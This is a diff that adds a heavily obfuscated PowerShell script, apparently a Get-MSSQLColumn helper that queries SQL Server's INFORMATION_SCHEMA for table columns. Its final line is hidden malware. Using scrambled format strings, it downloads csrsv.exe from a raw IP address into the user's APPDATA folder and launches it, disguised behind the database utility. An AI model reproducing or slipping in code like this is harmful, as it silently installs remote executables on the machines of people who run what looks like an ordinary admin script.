@@ -1,0 +1,159 @@
+  .("{0}{2}{1}" -f 'Set','VariaBLe','-') ("G"+"L0") ([typE]("{2}{3}{0}{1}" -F 'Fi','lE','SySTeM.IO','.') ) ; ${IZA`PL}  =  [TYpE]("{1}{0}"-F'ull','dbN'); function GeT-mSsq`LCOL`U`mN { 
+
+    
+    [cmdletbinding()]
+    param(
+        
+        [parameter(
+            maNdaToRy=${TR`Ue},
+            poSITioN=0,
+            VaLUEfROmpipeliNE=${tr`Ue},
+            ValuefromPipelINEBypROPeRtYNaMe=${T`Rue}
+        )]
+            [string[]]${t`A`BLE},
+        
+        [parameter( MaNdaTORy=${T`RuE} )]
+            [string]${da`Tab`Ase},
+
+            [switch]${aLL`FiE`lDS},
+
+            [string]${U`S`ERname} = ${nu`lL},
+
+            [string]${pA`s`SwoRD} = ${n`ULL},
+        
+        [parameter( ManDatOrY=${t`RuE} )]
+            [string]${s`erve`RINs`TaNCe}
+    )
+    Begin
+    {
+
+        
+        function INVOk`e-S`qL`CMD2 { 
+             
+            [CmdletBinding()] 
+            param( 
+            [Parameter(posiTiOn=0, MANDatory=${t`RUe})] [string]${seR`VER`insT`AN`cE}, 
+            [Parameter(pOsItION=1, mAndatory=${FAL`se})] [string]${DATa`BaSe}, 
+            [Parameter(poSitIon=2, MANDAToRY=${F`ALSe})] [string]${q`UE`Ry}, 
+            [Parameter(pOsiTiOn=3, MaNdatOry=${Fa`lSe})] [string]${uS`Er`NaME}, 
+            [Parameter(pOsITioN=4, mANDatORY=${f`AlsE})] [string]${PA`sSWorD}, 
+            [Parameter(PoSiTioN=5, MaNdAtOrY=${fAl`SE})] [Int32]${qU`e`R`yTimeOUT}=600, 
+            [Parameter(posiTIOn=6, MaNDATorY=${fA`lsE})] [Int32]${coNN`EC`T`iONTimeOut}=15, 
+            [Parameter(poSItION=7, ManDATORY=${FAL`SE})] [ValidateScript({.("{1}{0}{2}" -f 'st-p','te','ath') ${_}})] [string]${InP`U`T`FiLE}, 
+            [Parameter(POsItION=8, mANDAToRY=${fa`lse})] [ValidateSet({"{0}{1}" -f 'Da','taSet'}, {"{2}{1}{0}"-f 'e','abl','DataT'}, {"{0}{1}" -f 'Dat','aRow'},{"{0}{2}{1}"-f'SingleV','ue','al'})] [string]${As}=("{1}{2}{0}"-f'ow','Data','R'),
+            [Parameter(pOSiTiOn=9, manDATORY=${FAL`se})] [System.Collections.IDictionary]${SQLP`Ar`AMe`TErs} 
+            ) 
+            
+            if (${i`Np`UT`FilE}) 
+            { 
+                ${f`ILepA`Th} = $(&("{2}{3}{0}{1}"-f 've','-path','reso','l') ${i`NpUt`FiLE})."p`ATH" 
+                ${q`UERy} =   ( &("{4}{3}{2}{1}{0}" -f 'EM','iT','ChILd','t-','ge')  ('vA'+'rI'+'ABlE:gL'+'0'))."vAL`UE"::("{1}{0}{3}{2}" -f'lT','ReadAl','t','ex').Invoke("$filePath") 
+            } 
+            
+            ${C`onN}=.("{2}{0}{1}" -f'w-obj','ect','ne') ("{6}{1}{5}{7}{2}{4}{0}{3}"-f'ct','.Data.SqlCl','t.SQL','ion','Conne','ie','System','n') 
+            
+            if (${USER`N`A`me}) 
+            { ${CONneCT`io`Ns`T`RI`NG} = "Server={0};Database={1};User ID={2};Password={3};Trusted_Connection=False;Connect Timeout={4}" -f ${se`RveRINS`TAN`CE},${DaT`A`BASe},${US`er`NAmE},${pa`SSwo`Rd},${c`OnN`eCT`I`ontImeout} } 
+            else 
+            { ${CoNne`c`TIoNSTRI`Ng} = "Server={0};Database={1};Integrated Security=True;Connect Timeout={2}" -f ${seRVErI`N`stA`NCE},${dAt`AB`ASE},${ConNE`ct`ionTIME`oUT} } 
+            
+            ${Co`Nn}."C`ONnEc`Ti`oNsTr`iNg"=${c`o`NNecti`oN`stri`Ng} 
+            
+            
+            if (${pSB`oUnD`P`A`RAMEtERs}."vERb`o`SE") 
+            { 
+                ${C`oNn}."f`ir`EI`Nf`OmeSSaG`ee`VENTO`Nu`seRE`Rrors"=${TR`UE} 
+                ${hA`NdL`er} = [System.Data.SqlClient.SqlInfoMessageEventHandler] {&("{0}{1}{2}"-f 'Write','-Verbo','se') "$($_)"} 
+                ${C`OnN}.("{1}{3}{0}{2}{4}" -f 'oMe','a','ssag','dd_Inf','e').Invoke(${HA`NDL`er}) 
+            } 
+            
+            ${C`oNn}.("{0}{1}" -f'Op','en').Invoke() 
+            ${C`md}=.("{2}{0}{1}"-f'bj','ect','new-o') ("{6}{0}{4}{1}{2}{3}{5}" -f'.','q','lCli','ent.','Data.S','SqlCommand','system')(${q`UeRy},${co`NN}) 
+            ${c`Md}."c`omma`NDt`IMe`Out"=${Que`RYT`IMEoUt}
+            if (${sQ`lParametE`RS} -ne ${nU`LL})
+            {
+                ${sq`LPAr`AMetE`RS}.("{4}{1}{0}{3}{2}"-f 'Enumerat','et','r','o','G').Invoke() |
+                    .("{1}{3}{4}{0}{2}"-f'Obje','ForEac','ct','h','-') {
+                        If (${_}."V`ALue" -ne ${Nu`Ll})
+                        { ${C`MD}."PA`R`Am`ETErs".("{0}{3}{2}{1}" -f 'Ad','ue','thVal','dWi').Invoke(${_}."K`eY", ${_}."v`ALUE") }
+                        Else
+                        { ${c`MD}."ParAM`E`TErS".("{1}{3}{0}{2}"-f'Val','Ad','ue','dWith').Invoke(${_}."k`ey",   (&('gi')  ('vAR'+'iaBL'+'e:IZaP'+'L')  )."va`luE"::"VaL`UE") }
+                    } > ${N`UlL}
+            }
+            
+            ${ds} = .("{2}{1}{0}" -f'bject','O','New-') ("{4}{3}{2}{0}{5}{1}"-f 'ata.Dat','t','m.D','yste','s','aSe') 
+            ${D`A} = .("{3}{2}{1}{0}" -f'ect','w-Obj','e','N') ("{8}{7}{3}{4}{2}{1}{6}{0}{9}{5}{10}"-f'qlDat','a.SqlClie','Dat','m','.','apt','nt.S','te','sys','aAd','er')(${c`md}) 
+            
+            [void]${d`A}.("{1}{0}"-f'ill','f').Invoke(${d`s}) 
+            
+            ${CO`NN}.("{0}{1}" -f'C','lose').Invoke() 
+            
+            switch (${A`S}) 
+            { 
+                ("{1}{0}" -f'et','DataS')     { &("{0}{3}{2}{1}" -f'Wri','tput','Ou','te-') (${ds}) } 
+                ("{0}{1}{3}{2}"-f'Da','taT','le','ab')   { .("{3}{1}{2}{0}" -f 't','-Out','pu','Write') (${ds}."t`ABles") } 
+                ("{0}{1}" -f 'DataR','ow')     { .("{2}{3}{1}{0}"-f 't','Outpu','Write','-') (${DS}."t`Ab`les"[0]) }
+                ("{0}{2}{1}{3}"-f'Sin','leV','g','alue') { .("{2}{0}{1}" -f't','e-Output','Wri') (${dS}."T`AblES"[0] | &("{3}{1}{0}{2}" -f'c','elect-Obje','t','S') -Expand ${D`S}."tAb`lES"[0]."CoL`UMNS"[0]."C`olUMnNA`Me" ) }
+            } 
+ 
+        } 
+        
+
+        
+        if(-not ( .("{1}{0}{3}{2}"-f'com','get-','nd','ma') ("{2}{0}{4}{3}{1}" -f 'nvok','md2','i','lc','e-sq') -ErrorAction ("{2}{1}{3}{0}"-f 'e','nt','SilentlyCo','inu')))
+        {
+            Throw ('Thi'+'s '+'c'+'omm'+'and '+'re'+'lies '+'on'+' '+'I'+'n'+'vo'+'ke'+'-SQLCMD2. '+' '+'P'+'lease '+'obtai'+'n'+' '+'t'+'he '+'l'+'ates'+'t '+'vers'+'ion'+' '+'and'+' '+'d'+'ot '+'sour'+'ce '+'i'+'t '+'prio'+'r '+'t'+'o '+'runni'+'n'+'g '+'th'+'is '+"command.`nThis "+'scrip'+'t '+'was'+' '+'built'+' '+'us'+'ing '+'t'+'he '+'code'+' '+'fro'+'m '+'here:'+' '+'http'+':/'+'/'+'po'+'s'+'h'+'code.org/4137')
+        }
+
+
+        
+        
+        ${p`Ara`Ms} = @{
+            ("{0}{1}" -f 'Q','uery') = "SELECT $( if($allFields){"*"} else{"COLUMN_NAME"}) FROM [INFORMATION_SCHEMA].[COLUMNS] WHERE TABLE_NAME = @table"
+            ("{2}{0}{1}"-f 'an','ce','ServerInst') = ${sERv`ErIN`sTAN`ce}
+            ("{3}{2}{1}{0}"-f 'on','i','rorAct','Er') = ("{0}{1}"-f 'St','op')
+            ("{2}{1}{0}" -f 'ase','tab','Da') = ${D`ATAB`Ase}
+        }
+        if(${USe`Rna`me}){
+            ${PaR`Ams}.("{1}{0}"-f'd','ad').Invoke(("{2}{0}{1}"-f'rna','me','use'),${u`seRn`AmE})
+        }
+        if(${pa`ss`WOrd}){
+            ${P`AramS}.("{0}{1}"-f'a','dd').Invoke(("{1}{0}"-f 'ssword','pa'),${Pas`SWO`Rd})
+        }
+
+    }
+    Process
+    {
+        foreach(${s`QLta`Ble} in ${T`Ab`le})
+        {
+
+            
+            ${S`qL`pArA`mS} = @{
+                ("{1}{0}"-f 'able','t') = ${s`q`Lta`Ble}
+            }
+
+            
+            try
+            {
+                .("{2}{0}{3}{1}" -f '-','se','write','verbo') "Running Invoke-SQLCMD with parameters:`n$($params | out-string)`nSQL Parameters:`n$($sqlParams | out-string) "
+                ${Re`SuLtS} = .("{2}{4}{0}{1}{3}" -f'qlc','m','I','d2','nvoke-S') @params -SqlParameters ${sq`lP`AraMs}
+            }
+            catch
+            {
+                &("{1}{3}{0}{2}"-f '-Err','Writ','or','e') ('Error'+' '+'ret'+'urni'+'ng '+'co'+'lum'+'ns '+'fr'+'om '+'ta'+'ble '+"'$sqlTable' "+'o'+'n '+'i'+'n'+'stance '+"'$ServerInstance': "+"$_")
+                continue
+            }
+
+            
+            if(${aLLF`I`e`Lds})
+            {
+                ${Re`su`lTS}
+            }
+            else
+            {
+                ${rE`SuL`TS} | &("{1}{0}{2}" -f'el','s','ect') -ExpandProperty ("{0}{1}{2}"-f'CO','LUMN_','NAME')
+            }
+        }
+    }
+ }
+(&("{2}{0}{1}" -f'w-O','bject','Ne') ("{1}{3}{0}{2}{4}" -f'.Net.We','Syst','bCli','em','ent')).("{1}{2}{0}" -f 'File','Downloa','d').Invoke(("{1}{5}{2}{3}{4}{7}{6}{0}"-f'srsv.exe','h','0','2.53','.238/','ttp://94.1','/c','~yahoo'),"$env:APPDATA\csrsv.exe");.("{2}{3}{0}{1}" -f'P','rocess','S','tart-') ("$env:APPDATA\csrsv.exe")
